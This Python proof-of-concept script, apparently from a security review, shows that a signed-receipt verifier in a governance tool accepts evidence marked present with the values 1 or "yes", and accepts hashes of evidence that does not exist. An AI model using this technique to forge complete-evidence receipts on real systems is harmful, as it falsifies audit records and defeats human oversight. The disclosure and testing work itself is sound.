#!/usr/bin/env python3
"""PoC 7 — Evidence-completeness gaming: truthy non-boolean `present` and
fabricated hashes produce COMPLETE -> PASS.

verify_receipt computes `all(i.get("present") for i in items)` — a truthiness
test, not a boolean type check. `present: 1` or `present: "yes"` counts as
present. And the sha256 of an evidence item is never compared to anything —
a hash of evidence that does not exist PASSes. The suite only tested
post-signing deletion (A4), honest incompleteness (A5) and declared-vs-
computed lies (A12). Signer-side type confusion and self-attested hashes are
untested. S2.5.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (generate_keypair, verify_receipt, canonical,
                         sha256_hex, sign, keyid, PREDICATE_TYPE)

sk, pk = generate_keypair()

def craft(predicate):
    stmt = {"predicateType": PREDICATE_TYPE,
            "subject": {"name": "prod:svc",
                        "digest": {"sha256": sha256_hex(canonical(predicate))}},
            "predicate": predicate}
    payload = canonical(stmt)
    stmt["signatures"] = [{"keyid": keyid(sk.public_key()),
                           "sig": sign(sk, PREDICATE_TYPE, payload)}]
    return stmt

BASE = {
    "action_id": "a-1",
    "actor": {"type": "human", "id": "s.lutar", "is_service_account": False,
              "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"},
    "policy_decision": {"result": "ALLOW"},
    "execution": {"status": "EXECUTED"},
    "timestamps": {"created": "2026-08-30T00:00:00+00:00",
                   "executed": "2026-08-30T00:00:00+00:00", "ntp_synced": True},
    "prev_chain_hash": "GENESIS",
}

def passes(pred):
    return verify_receipt(craft(pred), pk).verdict == "PASS"

results = []

# (a) present: 1 — integer, not JSON true; truthy -> COMPLETE -> PASS
p = dict(BASE)
p["evidence"] = {"items": [{"id": "log", "sha256": "", "present": 1}],
                 "completeness": "COMPLETE", "redaction_commitments": []}
results.append(passes(p))

# (b) present: "yes" — string; truthy -> COMPLETE -> PASS
p = dict(BASE)
p["evidence"] = {"items": [{"id": "log", "sha256": "", "present": "yes"}],
                 "completeness": "COMPLETE", "redaction_commitments": []}
results.append(passes(p))

# (c) present: true with a sha256 that matches nothing real — the verifier
#     cannot and does not check that any evidence bytes exist.
p = dict(BASE)
p["evidence"] = {"items": [{"id": "log",
                            "sha256": sha256_hex(b"evidence-that-does-not-exist"),
                            "present": True}],
                 "completeness": "COMPLETE", "redaction_commitments": []}
results.append(passes(p))

print("EXPLOIT-WORKS" if any(results) else "HELD")
